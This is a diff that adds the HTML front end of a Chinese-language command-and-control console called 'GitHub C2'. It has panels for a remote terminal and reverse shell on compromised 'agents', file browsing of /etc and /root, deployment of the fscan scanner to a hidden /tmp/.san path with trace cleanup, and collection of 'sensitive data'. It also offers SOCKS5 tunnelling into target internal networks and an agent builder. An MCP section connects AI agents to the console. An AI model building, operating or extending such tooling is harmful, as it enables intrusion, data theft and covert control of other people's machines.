@@ -1,0 +1,1206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>C2 控制台</title>
+<link rel="stylesheet" href="/static/css/style.css">
+<script src="/static/js/marked.min.js"></script>
+</head>
+<body>
+<div id="app">
+
+  <!-- ── Sidebar ─────────────────────────────────────────────────────────── -->
+  <aside id="sidebar">
+    <div id="sidebar-header">
+      <span class="logo-icon">🎯</span>
+      <div>
+        <div class="sidebar-title">GitHub C2</div>
+        <div class="sidebar-sub">Web Controller</div>
+      </div>
+    </div>
+
+    <div id="sidebar-stats">
+      <div class="mini-stat">
+        <span class="mini-stat-num" id="ms-agents">–</span>
+        <span class="mini-stat-label">Agents</span>
+      </div>
+      <div class="mini-stat mini-stat-online">
+        <span class="mini-stat-num" id="ms-online">–</span>
+        <span class="mini-stat-label">Online</span>
+      </div>
+    </div>
+
+    <div id="agent-list">
+      <div class="agent-list-label">
+        AGENTS <span id="agent-count" class="badge">0</span>
+      </div>
+      <div class="agent-search-wrap">
+        <input type="text" id="agent-search" placeholder="Filter agents…"
+               autocomplete="off" spellcheck="false">
+      </div>
+      <div id="agents-container">
+        <div class="skel-row"><div class="skel-avatar"></div><div class="skel-lines"><div class="skel-bar" style="width:70%"></div><div class="skel-bar" style="width:45%"></div></div><div class="skel-bar skel-right" style="width:26px"></div></div>
+        <div class="skel-row"><div class="skel-avatar"></div><div class="skel-lines"><div class="skel-bar" style="width:55%"></div><div class="skel-bar" style="width:62%"></div></div><div class="skel-bar skel-right" style="width:26px"></div></div>
+        <div class="skel-row"><div class="skel-avatar"></div><div class="skel-lines"><div class="skel-bar" style="width:80%"></div><div class="skel-bar" style="width:35%"></div></div><div class="skel-bar skel-right" style="width:26px"></div></div>
+        <div class="skel-row"><div class="skel-avatar"></div><div class="skel-lines"><div class="skel-bar" style="width:62%"></div><div class="skel-bar" style="width:50%"></div></div><div class="skel-bar skel-right" style="width:26px"></div></div>
+      </div>
+    </div>
+
+    <div id="sidebar-tools">
+      <div style="font-size:10px;font-weight:700;color:var(--text-3);letter-spacing:.07em;padding:0 14px 4px">控制台工具</div>
+      <button class="btn-sidebar tool-nav" data-tab="builder"  onclick="switchTab('builder')" data-i18n="nav.builder">🔧 生成器</button>
+      <button class="btn-sidebar tool-nav" data-tab="mcp"      onclick="switchTab('mcp')">🤖 MCP 接入</button>
+      <button class="btn-sidebar tool-nav" data-tab="settings" onclick="switchTab('settings')" data-i18n="nav.settings">⚙ 设置</button>
+    </div>
+
+    <div id="sidebar-footer">
+      <button class="btn-sidebar" onclick="refreshAgents()">🔄 刷新列表</button>
+      <button class="btn-sidebar btn-warn" onclick="cleanupIssues()">🧹 清理通道消息</button>
+      <a href="/logout" class="btn-sidebar btn-logout">⏻ Logout</a>
+      <div id="build-id" class="build-id" title="controller build"></div>
+    </div>
+  </aside>
+
+  <!-- ── Main ────────────────────────────────────────────────────────────── -->
+  <main id="main">
+    <nav id="tab-bar">
+      <button class="tab-btn active" data-tab="terminal" data-i18n="nav.terminal">⌨ 终端</button>
+      <button class="tab-btn" data-tab="wsshell" data-i18n="nav.wsshell">🖥 反弹Shell</button>
+      <button class="tab-btn" data-tab="files" data-i18n="nav.files">📁 文件</button>
+      <button class="tab-btn" data-tab="tunnel" data-i18n="nav.tunnel">🔗 隧道</button>
+      <button class="tab-btn" data-tab="scan" data-i18n="nav.scan">🔍 扫描</button>
+      <button class="tab-btn" data-tab="sysinfo" data-i18n="nav.sysinfo">🖥 系统信息</button>
+      <button class="tab-btn" data-tab="library" data-i18n="nav.library">📚 资料库</button>
+      <button class="tab-btn" data-tab="report" data-i18n="nav.report">📋 报告</button>
+      <button class="tab-btn" data-tab="upgrade" title="升级当前选中的 Agent" data-i18n="nav.upgrade">⬆ 升级</button>
+      <div id="tab-indicator" aria-hidden="true"></div>
+    </nav>
+
+    <div id="no-agent-msg">
+      <div id="no-agent-inner">
+
+        <!-- KPI row -->
+        <div id="kpi-row">
+          <div class="kpi-card">
+            <div class="kpi-label">Agents</div>
+            <div class="kpi-value" id="kpi-agents">–</div>
+            <div class="kpi-delta" id="kpi-agents-delta">&nbsp;</div>
+          </div>
+          <div class="kpi-card kpi-online">
+            <div class="kpi-label">Online now</div>
+            <div class="kpi-value" id="kpi-online">–</div>
+            <div class="kpi-delta" id="kpi-online-delta">&nbsp;</div>
+          </div>
+          <div class="kpi-card">
+            <div class="kpi-label">Messages (24h)</div>
+            <div class="kpi-value" id="kpi-msgs">–</div>
+            <div class="kpi-delta" id="kpi-msgs-delta">&nbsp;</div>
+          </div>
+          <div class="kpi-card">
+            <div class="kpi-label">Commands (24h)</div>
+            <div class="kpi-value" id="kpi-cmds">–</div>
+            <div class="kpi-delta" id="kpi-cmds-delta">&nbsp;</div>
+          </div>
+        </div>
+
+        <!-- Empty state -->
+        <div class="empty-state">
+          <div class="empty-state-icon">🖥</div>
+          <div class="empty-state-heading">选择一个 Agent 开始</div>
+          <div class="empty-state-text">
+            从左侧列表选择目标机器；或先配置 GitHub / Notion 通道，等待 Agent 上线。
+          </div>
+          <button class="btn-primary" onclick="refreshAgents()">🔄 刷新 Agents</button>
+          <a href="#" class="empty-state-link"
+             onclick="event.preventDefault();switchTab('settings')">⚙ 打开 Settings 配置通道 →</a>
+        </div>
+
+        <!-- Recent activity -->
+        <div class="activity-panel">
+          <div class="activity-header">
+  <button id="lang-toggle" onclick="toggleLang()" style="position:absolute;top:12px;right:16px;z-index:1000;padding:4px 12px;border:1px solid var(--border);border-radius:4px;background:var(--bg-2);color:var(--text);cursor:pointer;font-size:12px;letter-spacing:.5px" title="Switch Language">EN</button>
+            <span class="activity-title">最近操作</span>
+            <button class="btn-ghost-sm" onclick="loadActivity()" title="重新加载">🔄</button>
+          </div>
+          <div id="activity-timeline" class="activity-timeline"></div>
+          <a href="#" class="activity-footer"
+             onclick="event.preventDefault();openAudit()">查看全部操作记录 →</a>
+        </div>
+
+      </div>
+    </div>
+
+    <div id="tab-panels" style="display:none">
+
+      <!-- Terminal -->
+      <div class="tab-panel active" id="panel-terminal">
+        <div class="panel-toolbar">
+          <div class="toolbar-left">
+            <span class="panel-title">Terminal</span>
+            <label class="toggle-label">
+              <input type="checkbox" id="chk-interactive"> Interactive
+            </label>
+          </div>
+          <div class="toolbar-right">
+            <button class="btn-sm btn-danger" onclick="clearHistory()">🗑 清空历史</button>
+          </div>
+        </div>
+        <div class="term-filter-bar">
+          <input type="text" id="term-search" placeholder="🔍 Filter lines…"
+                 autocomplete="off" spellcheck="false">
+          <button class="term-chip active" id="term-chip-cmd" onclick="toggleTermChip('cmd')"
+                  title="显示/隐藏 命令">⌨ cmd <span class="term-chip-count" id="tc-cmd">0</span></button>
+          <button class="term-chip active" id="term-chip-resp" onclick="toggleTermChip('resp')"
+                  title="显示/隐藏 响应">↩ resp <span class="term-chip-count" id="tc-resp">0</span></button>
+          <button class="term-chip active" id="term-chip-sys" onclick="toggleTermChip('sys')"
+                  title="显示/隐藏 系统消息">· sys <span class="term-chip-count" id="tc-sys">0</span></button>
+          <span style="flex:1"></span>
+          <span id="term-live-pill" class="live-pill" onclick="toggleTermLive()"
+                role="button" tabindex="0"
+                title="自动滚动到底部（点击暂停/恢复）">
+            <span class="live-dot"></span><span id="term-live-label">Live</span>
+          </span>
+        </div>
+        <div id="terminal-output"></div>
+        <div id="term-status-bar">
+          <span id="term-count">0 cmd · 0 resp · 0 sys</span>
+          <span style="flex:1"></span>
+          <span id="term-buffer-info" class="label-muted">缓冲上限 500 块</span>
+        </div>
+        <div id="terminal-input-bar">
+          <span class="prompt">❯</span>
+          <input type="text" id="terminal-input" placeholder="Enter command… (↑/↓ 历史)"
+                 autocomplete="off" spellcheck="false">
+          <div style="position:relative">
+            <button class="btn-sm" title="命令历史" onclick="toggleCmdHistory()">🕘</button>
+            <div id="cmd-history-drop" style="display:none;position:absolute;bottom:calc(100% + 6px);right:0;width:340px;max-height:260px;overflow:auto;background:var(--bg-2);border:1px solid var(--border);border-radius:6px;box-shadow:0 8px 24px rgba(0,0,0,.45);z-index:500"></div>
+          </div>
+          <button class="btn-primary" onclick="sendCommand()">Send</button>
+        </div>
+      </div>
+
+      <!-- Files -->
+      <div class="tab-panel" id="panel-files">
+        <div class="panel-toolbar">
+          <span class="panel-title">文件管理器</span>
+          <span id="files-agent-indicator" class="agent-indicator"></span>
+          <div class="toolbar-right">
+            <button class="btn-sm" onclick="filesGoUp()">⬆ 上级</button>
+            <input type="text" id="files-path" value="/" placeholder="Path" style="flex:1;max-width:400px"
+                   onkeydown="if(event.key==='Enter') filesRefresh(null, true)">
+            <button class="btn-sm" onclick="filesRefresh(null, true)">🔄 刷新</button>
+            <label class="btn-sm btn-primary" style="cursor:pointer">
+              📤 上传
+              <input type="file" id="file-upload-input" style="display:none" onchange="uploadFile()">
+            </label>
+          </div>
+        </div>
+        <div id="file-status-bar"></div>
+        <!-- Quick paths + breadcrumb navigation -->
+        <div style="display:flex;align-items:center;gap:6px;padding:4px 14px;flex-wrap:wrap;border-bottom:1px solid var(--border);background:var(--bg-2)">
+          <span style="font-size:10px;color:var(--text-muted);font-weight:600">QUICK</span>
+          <button class="btn-sm" style="padding:1px 8px;font-size:10px" onclick="filesGo('/')">/</button>
+          <button class="btn-sm" style="padding:1px 8px;font-size:10px" onclick="filesGo('/tmp')">tmp</button>
+          <button class="btn-sm" style="padding:1px 8px;font-size:10px" onclick="filesGo('/etc')">etc</button>
+          <button class="btn-sm" style="padding:1px 8px;font-size:10px" onclick="filesGo('/var/log')">var/log</button>
+          <button class="btn-sm" style="padding:1px 8px;font-size:10px" onclick="filesGo('/home')">home</button>
+          <button class="btn-sm" style="padding:1px 8px;font-size:10px" onclick="filesGo('/root')">root</button>
+          <button class="btn-sm" style="padding:1px 8px;font-size:10px" onclick="filesGo('/dev/shm')">shm</button>
+          <span style="border-left:1px solid var(--border);height:16px"></span>
+          <div id="files-breadcrumb" style="font-family:var(--mono);font-size:11px;display:flex;align-items:center;gap:2px;flex-wrap:wrap"></div>
+        </div>
+        <div id="files-table-wrap">
+          <table id="files-table">
+            <thead><tr>
+              <th>Name</th><th>Type</th><th>Size</th><th>Actions</th>
+            </tr></thead>
+            <tbody id="files-body"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Scan -->
+      <!-- Scan (fscan) -->
+      <div class="tab-panel" id="panel-scan">
+        <div class="panel-toolbar">
+          <span class="panel-title">🔍 Scan (fscan)</span>
+          <span id="scan-agent-indicator" class="agent-indicator"></span>
+          <div class="toolbar-right" style="font-size:11px;color:var(--text-muted)">
+            Binary: <code style="margin:0 4px">/tmp/.san</code>
+            &nbsp;·&nbsp;
+            <a href="https://github.com/shadow1ng/fscan" target="_blank" style="color:var(--accent)">fscan docs ↗</a>
+          </div>
+        </div>
+
+        <!-- Top config bar -->
+        <div style="padding:10px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;background:var(--bg-2);flex-shrink:0">
+          <span style="font-size:12px;color:var(--text-muted);white-space:nowrap">Binary URL:</span>
+          <input type="text" id="sc-url" placeholder="https://your.server/fscan_linux_amd64" style="flex:1;min-width:0">
+          <button class="btn-sm" onclick="scanSaveConfig()">💾 保存</button>
+        </div>
+
+        <!-- Main area: left=controls, right=output -->
+        <div style="display:flex;flex:1;overflow:hidden">
+
+          <!-- Left: args + buttons + examples -->
+          <div style="width:400px;min-width:300px;padding:14px 16px;overflow-y:auto;border-right:1px solid var(--border);display:flex;flex-direction:column;gap:10px">
+
+            <div>
+              <div style="font-size:11px;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.05em;margin-bottom:5px">Arguments (full command after binary)</div>
+              <textarea id="sc-args" rows="10"
+                placeholder="-h 192.168.1.1/24 -np -nobr -nopoc -o /tmp/r.txt&#10;-h 10.0.0.1/24 -p 22,80,443,3306,3389 -o /tmp/r.txt&#10;-h 192.168.1.1 -m ms17010&#10;-h 192.168.1.1/24 -m ssh -p 22 -o /tmp/r.txt"
+                style="width:100%;box-sizing:border-box;font-family:var(--mono);font-size:12px;resize:vertical;line-height:1.5"></textarea>
+            </div>
+
+            <!-- Action buttons -->
+            <div style="display:flex;flex-wrap:wrap;gap:7px">
+              <button class="btn-action btn-success" onclick="scanAction('deploy')" title="下载 /tmp/.san 后立即运行">⬇ 下发并运行</button>
+              <button class="btn-action btn-primary"  onclick="scanAction('run')"   title="运行已存在的 /tmp/.san">▶ 运行</button>
+              <button class="btn-action btn-warning"  onclick="scanAction('stop')"  title="停止 /tmp/.san 进程">⏹ 停止</button>
+              <div class="action-sep"></div>
+              <button class="btn-action btn-danger"   onclick="scanAction('sweep')" title="停止进程并删除 /tmp/.san">🧹 清理痕迹</button>
+            </div>
+
+            <!-- Read result (custom command) -->
+            <div style="display:flex;gap:6px;align-items:center">
+              <input type="text" id="sc-read-cmd" placeholder="cat /tmp/r.txt" style="flex:1;min-width:0;font-family:var(--mono);font-size:12px">
+              <button class="btn-sm btn-primary" onclick="scanReadResult()" title="Run read command, output appears on the right">📄 读取结果</button>
+            </div>
+
+            <!-- Divider -->
+            <div style="border-top:2px solid var(--border);padding-top:10px">
+              <div style="font-size:11px;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px">Common Examples <span style="font-weight:400;opacity:.6">(click 📋 to copy into args)</span></div>
+              <div id="scan-examples"></div>
+            </div>
+          </div>
+
+          <!-- Right: output area -->
+          <div style="flex:1;display:flex;flex-direction:column;overflow:hidden">
+            <div style="padding:6px 14px;font-size:11px;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.05em;border-bottom:1px solid var(--border);background:var(--bg-2);display:flex;align-items:center;gap:10px;flex-shrink:0">
+              <span>Output</span>
+              <span id="sc-out-ts" style="font-weight:400;opacity:.7"></span>
+              <span style="flex:1"></span>
+              <button class="btn-sm" onclick="scanClearOutput()">🗑 Clear</button>
+            </div>
+            <pre id="sc-output" style="flex:1;margin:0;padding:12px 16px;overflow:auto;font-family:var(--mono);font-size:12px;line-height:1.6;background:#0d1117;color:#c9d1d9;white-space:pre-wrap;word-break:break-all">Scan output will appear here after clicking 📄 Read…</pre>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- SysInfo -->
+      <div class="tab-panel" id="panel-sysinfo">
+        <div class="panel-toolbar">
+          <span class="panel-title" id="sysinfo-title">系统信息 &amp; 敏感数据</span>
+          <div class="toolbar-right">
+            <select id="sysinfo-history-sel" onchange="loadSysinfoSnapshot()" style="display:none"></select>
+            <button class="btn-sm" onclick="triggerSysinfo()">🖥 采集系统信息</button>
+            <select id="sensitive-history-sel" onchange="loadSensitiveSnapshot()" style="display:none"></select>
+            <button class="btn-sm btn-warning" onclick="triggerSensitive()">🔑 采集敏感数据</button>
+            <button class="btn-sm btn-danger" onclick="uninstallAgent()" title="下发卸载命令给 Agent">🗑 卸载 Agent</button>
+          </div>
+        </div>
+        <div style="flex:1;overflow:hidden;display:flex;flex-direction:column">
+          <div style="padding:5px 14px;font-size:11px;font-weight:600;color:var(--text-muted);background:var(--bg-2);border-bottom:1px solid var(--border);flex-shrink:0">🖥 系统信息</div>
+          <div id="sysinfo-content" class="mono-output" style="height:42%;overflow:auto;border-bottom:1px solid var(--border)"></div>
+          <div style="padding:5px 14px;font-size:11px;font-weight:600;color:var(--text-muted);background:var(--bg-2);border-bottom:1px solid var(--border);flex-shrink:0">🔑 敏感数据</div>
+          <div id="sensitive-content" class="sections-output" style="flex:1;overflow:auto"></div>
+        </div>
+      </div>
+
+      <!-- Tunnel -->
+      <div class="tab-panel" id="panel-tunnel">
+        <div class="panel-toolbar">
+          <div class="toolbar-left">
+            <span class="panel-title">🔗 SOCKS5 隧道（Stowaway）</span>
+            <span id="stow-badge" class="shell-badge shell-stopped">● 未运行</span>
+            <span id="stow-server-info" style="font-size:11px;color:var(--text-muted)"></span>
+            <span id="tunnel-agent-indicator" class="agent-indicator"></span>
+          </div>
+          <div class="toolbar-right">
+            <button class="btn-sm btn-primary" onclick="stowStart()" title="在控制器本机启动 Stowaway Admin（监听+SOCKS5）">▶ 启动服务端</button>
+            <button class="btn-sm btn-danger"  onclick="stowStop()" title="停止控制器本机的 Stowaway Admin">⏹ 停止服务端</button>
+            <button class="btn-sm" onclick="stowSaveConfig()" data-i18n="builder.saveBtn">💾 保存配置</button>
+          </div>
+        </div>
+
+        <!-- 架构说明条 -->
+        <div style="padding:6px 16px;background:var(--bg-2);border-bottom:1px solid var(--border);font-size:11px;color:var(--text-muted);line-height:1.7">
+          架构：<b>服务端</b>=控制器本机的 stowaway_admin（左侧配置，已随部署包内置，无需下载）；
+          <b>目标端</b>=Agent <b>内置</b>的隧道节点（右侧点"启动"下发 <code>tunnel IP:端口 Secret</code> 即可，不在目标机落任何额外文件）。
+          浏览器/工具连本机 SOCKS5 端口即可穿透目标内网。
+        </div>
+
+        <!-- tmux info bar (same style as Shell Tab) -->
+        <div id="stow-tmux-bar" style="display:none;padding:5px 16px;background:#0d1117;border-bottom:1px solid var(--border);font-size:12px;font-family:var(--mono);color:#57ab5a;align-items:center;gap:10px;flex-wrap:wrap">
+          📟 tmux:&nbsp;<code id="stow-tmux-name" style="color:#e3b341"></code>
+          &nbsp;&nbsp;
+          <span style="color:#768390">Attach:</span>&nbsp;
+          <code id="stow-tmux-attach" style="cursor:pointer;color:#57ab5a" onclick="navigator.clipboard.writeText(this.textContent);toast('Copied','success')"></code>
+        </div>
+        <div style="display:flex;flex:1;overflow:hidden">
+
+          <!-- Left: Admin config -->
+          <div style="width:340px;min-width:280px;border-right:1px solid var(--border);padding:16px 18px;overflow-y:auto;display:flex;flex-direction:column;gap:10px">
+            <div style="font-size:11px;font-weight:700;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em">
+              🖥 服务端配置（控制器本机）
+            </div>
+
+            <div class="settings-grid" style="grid-template-columns:auto 1fr;gap:6px 10px">
+              <label style="font-size:12px">监听端口：</label>
+              <input type="text" id="stow-listen" placeholder="9998" style="width:100%;box-sizing:border-box">
+              <label style="font-size:12px">SOCKS5 端口：</label>
+              <input type="text" id="stow-socks"  placeholder="1080" style="width:100%;box-sizing:border-box">
+            </div>
+            <div style="font-size:11px;color:var(--text-muted)">
+              传输 Secret（与 Settings 隧道 Secret 相同，此处不回显全文）:
+              <code id="stow-secret-show" style="color:var(--text);cursor:pointer">…</code>
+            </div>
+            <div style="font-size:11px;color:var(--text-muted)">
+              SOCKS5 账号: <code id="stow-socks-user" style="color:var(--text)">s5admin</code>
+              / 密码: <code id="stow-socks-pass" style="color:var(--text)">123456</code>
+              （与 Admin 启动参数一致）
+            </div>
+
+            <!-- Binary info -->
+            <div style="font-size:11px;color:var(--text-muted)">
+              二进制（部署包内置）: <code id="stow-bin-path" style="font-size:10px"></code>
+              <span id="stow-bin-missing" style="color:var(--red);display:none">⚠ 缺失</span>
+            </div>
+          </div>
+
+          <!-- Right: Agent (target side) -->
+          <div style="flex:1;padding:16px 18px;overflow-y:auto;display:flex;flex-direction:column;gap:10px">
+            <div style="font-size:11px;font-weight:700;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em">
+              🎯 目标端（Agent 内置，无需落地文件）
+            </div>
+
+            <div class="settings-grid" style="max-width:560px">
+              <label>回连 IP：</label>
+              <div style="display:flex;gap:8px;align-items:center">
+                <input type="text" id="tn-ip" placeholder="1.2.3.4" style="width:160px">
+                <label>端口：</label>
+                <input type="text" id="tn-port" placeholder="9998" style="width:75px">
+              </div>
+              <label>Secret：</label>
+              <div style="display:flex;gap:8px;align-items:center">
+                <input type="password" id="tn-secret" placeholder="留空=沿用已有" autocomplete="off" style="width:160px">
+                <button class="btn-sm" onclick="saveTunnelConfig()">💾 保存</button>
+              </div>
+            </div>
+
+            <div class="info-bar" style="max-width:560px">
+              <span class="label-muted">Built-in tunnel</span>
+              <span class="label-muted" style="margin-left:12px">no external binary needed</span>
+            </div>
+
+            <div class="tunnel-actions">
+              <button class="btn-action btn-success" onclick="tunnelAction('start')" title="向目标 Agent 下发隧道启动命令（内置节点，无文件落地）">▶ 启动目标端隧道</button>
+              <button class="btn-action btn-danger"  onclick="tunnelAction('stop')" title="停止 Agent 内置隧道节点——纯内存实现，停止即清理，无文件残留">⏹ 停止目标端（即清理）</button>
+            </div>
+
+            <details class="usage-guide" style="max-width:560px;margin-top:8px">
+              <summary>📋 使用流程</summary>
+              <div class="guide-body">
+                <p>① 点上方 <strong>▶ 启动服务端</strong> —— 控制器本机 Admin 监听 :&lt;监听端口&gt;</p>
+                <p>② 填好回连 IP / 端口（Secret 自动带出），点 <strong>▶ 启动目标端隧道</strong> —— Agent 内置节点回连</p>
+                <p>③ Admin 自动在本机开 SOCKS5 :&lt;SOCKS5端口&gt;（s5admin / 123456）</p>
+                <p>④ 浏览器/工具代理填 <code>127.0.0.1:&lt;SOCKS5端口&gt;</code>，即可以目标机为跳板访问其内网</p>
+                <p>⑤ 收工：<strong>⏹ 停止目标端</strong>（内置节点纯内存，停止即清理）+ <strong>⏹ 停止服务端</strong>（关 Admin）</p>
+              </div>
+            </details>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- Library -->
+      <div class="tab-panel" id="panel-library">
+        <div class="panel-toolbar">
+          <span class="panel-title">📚 资料库</span>
+          <div class="toolbar-right">
+            <button class="btn-sm btn-primary" onclick="newNote()">📝 新笔记</button>
+            <button class="btn-sm" onclick="newFile()">📄 新文件</button>
+            <label class="btn-sm" style="cursor:pointer">
+              📤 上传
+              <input type="file" id="lib-upload-input" style="display:none" onchange="libUpload()">
+            </label>
+            <button class="btn-sm" onclick="loadLibrary()">🔄 Refresh</button>
+          </div>
+        </div>
+        <div id="lib-dir-bar" class="info-bar" style="margin:8px 16px 0">
+          <span class="label-muted">Local path:</span>
+          <code id="lib-dir-path">—</code>
+        </div>
+        <div id="lib-content" style="display:flex;flex:1;overflow:hidden">
+          <!-- File tree (left) -->
+          <div id="lib-tree">
+            <div id="lib-tree-inner"></div>
+          </div>
+          <!-- Right pane -->
+          <div id="lib-editor-pane">
+
+            <!-- Empty state -->
+            <div id="lib-editor-empty">
+              <div class="placeholder-icon" style="font-size:36px">📄</div>
+              <div class="placeholder-text">Click any file to open it</div>
+            </div>
+
+            <!-- Wrapper shown when a file is open -->
+            <div id="lib-editor-wrap" style="display:none;flex-direction:column;height:100%">
+
+              <!-- Header: filename + actions -->
+              <div id="lib-editor-header">
+                <span id="lib-editor-title" style="font-weight:600;font-size:13px;color:var(--text-dim)"></span>
+                <div style="display:flex;gap:6px;align-items:center">
+                  <span id="lib-md-toggle" style="display:none">
+                    <button class="btn-sm" id="lib-preview-btn" onclick="toggleMdPreview()">👁 Preview</button>
+                  </span>
+                  <!-- Download current file -->
+                  <a id="lib-header-dl" class="btn-sm" href="#" download style="text-decoration:none">⬇ Download</a>
+                  <button class="btn-sm btn-primary" onclick="saveFile()" id="lib-save-btn" style="display:none">💾 Save</button>
+                  <button class="btn-sm btn-danger" onclick="libDeleteCurrent()">🗑 Delete</button>
+                  <button class="btn-sm" onclick="closeEditor()">✕</button>
+                </div>
+              </div>
+
+              <!-- Binary file info pane -->
+              <div id="lib-binary-pane" style="display:none;flex-direction:column;align-items:center;justify-content:center;flex:1;gap:16px;padding:40px">
+                <div style="font-size:48px">📦</div>
+                <div style="font-size:16px;font-weight:600;color:var(--text)" id="lib-binary-name"></div>
+                <div style="font-size:12px;color:var(--text-muted)" id="lib-binary-path"></div>
+                <a id="lib-binary-dl" class="btn-sm btn-primary" href="#" download
+                   style="text-decoration:none">
+                  ⬇ Download File
+                </a>
+                <div style="font-size:12px;color:var(--text-muted)">Binary file — cannot be edited in browser</div>
+              </div>
+
+              <!-- Text editor pane -->
+              <div id="lib-text-pane" style="display:none;flex-direction:column;flex:1;overflow:hidden">
+                <div id="lib-editor-body">
+                  <textarea id="lib-textarea" spellcheck="false"
+                            oninput="onEditorChange()"
+                            onkeydown="handleEditorKey(event)"></textarea>
+                  <div id="lib-md-preview" style="display:none"></div>
+                </div>
+                <div id="lib-editor-status"></div>
+              </div>
+
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- MCP guide -->
+      <div class="tab-panel" id="panel-mcp">
+        <div class="panel-toolbar">
+          <span class="panel-title">🤖 MCP 使用说明</span>
+          <div class="toolbar-right">
+            <button class="btn-sm btn-primary" onclick="mcpDownloadScript()">⬇ mcp_server.py</button>
+          </div>
+        </div>
+        <div style="flex:1;overflow-y:auto;padding:16px 20px;display:flex;flex-direction:column;gap:14px">
+
+          <div style="background:var(--bg-2);border:1px solid var(--border);border-radius:8px;padding:14px">
+            <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
+              <span style="font-weight:700;font-size:13px;color:var(--accent)">🤖 MCP 接入说明</span>
+              <span style="font-size:11px;color:var(--text-muted)">认证信息已按当前控制器实时填充</span>
+              <span style="flex:1"></span>
+              <button class="btn-sm btn-primary" onclick="mcpCopy('mcp-guide-block')">📋 一键复制完整说明</button>
+            </div>
+            <div style="font-size:12px;line-height:1.8;color:var(--text-1)">
+              把下面的说明直接粘贴给 openclaw 等 AI agent，它即可通过 MCP stdio 接入本控制台
+              （认证信息、控制器地址、12 个工具的用法都在内）。
+            </div>
+            <pre id="mcp-guide-block" style="margin-top:10px;padding:12px;background:#0d1117;color:#c9d1d9;border-radius:6px;font-family:var(--mono);font-size:11px;line-height:1.6;max-height:340px;overflow:auto;white-space:pre-wrap;word-break:break-word">加载中…</pre>
+          </div>
+
+          <div style="background:var(--bg-2);border:1px solid var(--border);border-radius:8px;padding:14px">
+            <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
+              <span style="font-weight:700;font-size:13px;color:var(--accent)">🧬 标准 MCP 能力清单 JSON</span>
+              <span style="font-size:11px;color:var(--text-muted)">protocolVersion / capabilities / 全部工具含 inputSchema</span>
+              <span style="flex:1"></span>
+              <button class="btn-sm btn-primary" onclick="mcpCopy('mcp-descriptor-block')">📋 复制能力 JSON</button>
+            </div>
+            <div style="font-size:12px;line-height:1.8;color:var(--text-1)">
+              标准 MCP（Model Context Protocol）格式的服务器能力描述，与服务器对
+              <code>initialize</code> / <code>tools/list</code> 的实际应答一致——AI agent 读它即知全部能力与参数。
+            </div>
+            <pre id="mcp-descriptor-block" style="margin-top:10px;padding:12px;background:#0d1117;color:#c9d1d9;border-radius:6px;font-family:var(--mono);font-size:11px;line-height:1.6;max-height:300px;overflow:auto;white-space:pre-wrap;word-break:break-word">加载中…</pre>
+          </div>
+
+          <div style="background:var(--bg-2);border:1px solid var(--border);border-radius:8px;padding:14px">
+            <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
+              <span style="font-weight:700;font-size:13px;color:var(--accent)">📦 MCP 客户端注册 JSON</span>
+              <span style="flex:1"></span>
+              <button class="btn-sm btn-primary" onclick="mcpCopy('mcp-json-block')">📋 复制 JSON</button>
+            </div>
+            <div style="font-size:12px;line-height:1.8;color:var(--text-1)">
+              Claude Desktop / 其他 MCP 客户端的 <code>mcpServers</code> 注册片段（含认证环境变量）。
+              把 <code>mcp_server.py</code> 放到 JSON 里指定的路径即可。
+            </div>
+            <pre id="mcp-json-block" style="margin-top:10px;padding:12px;background:#0d1117;color:#c9d1d9;border-radius:6px;font-family:var(--mono);font-size:11px;line-height:1.6;max-height:220px;overflow:auto;white-space:pre-wrap;word-break:break-word">加载中…</pre>
+          </div>
+
+          <div style="background:var(--bg-2);border:1px solid var(--border);border-radius:8px;padding:14px">
+            <div style="font-weight:700;font-size:13px;margin-bottom:8px;color:var(--accent)">🧰 工具清单</div>
+            <div id="mcp-tools" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:6px;font-size:12px">加载中…</div>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- Report -->
+      <div class="tab-panel" id="panel-report">
+        <div class="panel-toolbar">
+          <span class="panel-title">📋 Agent 报告</span>
+          <div class="toolbar-right" style="display:flex;align-items:center;gap:8px">
+            <!-- Search box -->
+            <div style="position:relative;display:flex;align-items:center">
+              <input type="text" id="report-search" placeholder="🔍 Search report…"
+                     oninput="reportSearch(this.value)"
+                     style="width:200px;padding:3px 28px 3px 8px;font-size:12px;border-radius:4px;border:1px solid var(--border);background:var(--bg-input);color:var(--text)">
+              <span id="report-search-count" style="position:absolute;right:6px;font-size:10px;color:var(--text-muted);pointer-events:none"></span>
+            </div>
+            <button class="btn-sm" onclick="loadReport()">🔄 Refresh</button>
+            <a id="btn-dl-report" class="btn-sm btn-primary" href="#" onclick="downloadReport(event)">
+              ⬇ Download Markdown
+            </a>
+          </div>
+        </div>
+        <div id="report-content" style="flex:1;overflow-y:auto;padding:20px 24px">
+          <div style="color:var(--text-muted);text-align:center;padding:40px">
+            Click Refresh to generate report
+          </div>
+        </div>
+      </div>
+
+      <!-- Builder -->
+      <div class="tab-panel" id="panel-builder">
+        <div class="panel-toolbar">
+          <span class="panel-title">🔧 Agent 生成器</span>
+          <div class="toolbar-right">
+            <span id="bld-status-badge" style="font-size:12px;font-weight:600;padding:3px 10px;border-radius:12px;background:var(--bg-2);border:1px solid var(--border)">Idle</span>
+          </div>
+        </div>
+        <div style="display:flex;flex:1;overflow:hidden">
+
+          <!-- Left: config -->
+          <div style="width:420px;min-width:320px;padding:14px 18px;overflow-y:auto;border-right:1px solid var(--border);display:flex;flex-direction:column;gap:8px">
+            <div style="font-size:11px;font-weight:700;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em">Build Configuration</div>
+
+            <div class="settings-grid" style="grid-template-columns:auto 1fr;gap:5px 10px">
